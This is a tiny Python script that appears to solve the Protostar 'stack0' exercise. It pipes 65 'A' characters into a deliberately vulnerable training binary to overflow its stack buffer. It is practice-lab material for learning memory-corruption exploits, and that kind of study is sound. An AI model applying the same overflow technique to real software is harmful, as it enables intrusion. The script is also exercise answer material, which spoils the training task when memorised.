import subprocess
import struct

program = "/opt/protostar/bin/stack0"

string = "A"*65
process = subprocess.Popen([program], stdin=subprocess.PIPE)
process.communicate(string+'\n');




